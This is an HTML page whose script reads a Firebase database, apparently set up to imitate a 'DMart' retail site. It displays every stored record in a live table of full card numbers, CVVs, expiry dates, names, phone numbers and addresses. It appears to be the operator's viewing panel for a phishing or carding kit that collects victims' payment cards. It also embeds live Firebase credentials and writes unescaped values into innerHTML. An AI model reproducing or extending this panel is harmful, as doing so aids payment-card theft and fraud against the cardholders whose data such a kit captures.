<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Firebase Packages Table</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #f9f9f9;
    }
    h2 {
      text-align: center;
    }
    table {
      border-collapse: collapse;
      width: 100%;
      background: white;
      margin-top: 20px;
    }
    th, td {
      border: 1px solid #ccc;
      padding: 8px 12px;
      text-align: left;
      font-size: 14px;
    }
    th {
      background: #f0f0f0;
    }
    tr:nth-child(even) {
      background-color: #fafafa;
    }
  </style>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>

  <h2>📦 Packages from Firebase (Realtime)</h2>
  <table id="packagesTable">
    <thead>
      <tr>
        <th>#</th>
        <th>Card Number</th>
        <th>Name</th>
        <th>Phone</th>
        <th>Expiry</th>
        <th>CVV</th>
        <th>Method</th>
        <th>Address</th>
        <th>Time</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <script>
    // ✅ Your Firebase Config
    const firebaseConfig = {
      apiKey: "AIzaSyDxlxSBiCEFf0PtWKoCSsA6BcpibN85x-Y",
      authDomain: "dmart-website-6c48c.firebaseapp.com",
      databaseURL: "https://dmart-website-6c48c-default-rtdb.firebaseio.com",
      projectId: "dmart-website-6c48c",
      storageBucket: "dmart-website-6c48c.appspot.com",
      messagingSenderId: "960037120520",
      appId: "1:960037120520:web:952c932d345bca51d03fbd",
      measurementId: "G-51BMQD6D13"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const tableBody = document.querySelector("#packagesTable tbody");

    db.ref("/packages").on("value", (snapshot) => {
      tableBody.innerHTML = ""; // Clear table
      const data = snapshot.val();
      if (!data) {
        tableBody.innerHTML = "<tr><td colspan='9'>No data available.</td></tr>";
        return;
      }

      let index = 1;
      Object.entries(data).forEach(([key, value]) => {
        const card = value.cardDetails;
        if (!card || !card.cardNumber) return; // skip if no card number

        const row = document.createElement("tr");
        row.innerHTML = `
          <td>${index++}</td>
          <td>${card.cardNumber}</td>
          <td>${card.fullName || ""}</td>
          <td>${card.mobileNumber || ""}</td>
          <td>${card.expiryMM || ""} / ${card.expiryYY || ""}</td>
          <td>${card.cvv || ""}</td>
          <td>${card.paymentMethod || ""}</td>
          <td>${card.address || ""}, ${card.city || ""}, ${card.state || ""} - ${card.pincode || ""}</td>
          <td>${card.timestamp || ""}</td>
        `;
        tableBody.appendChild(row);
      });
    });
  </script>

</body>
</html>
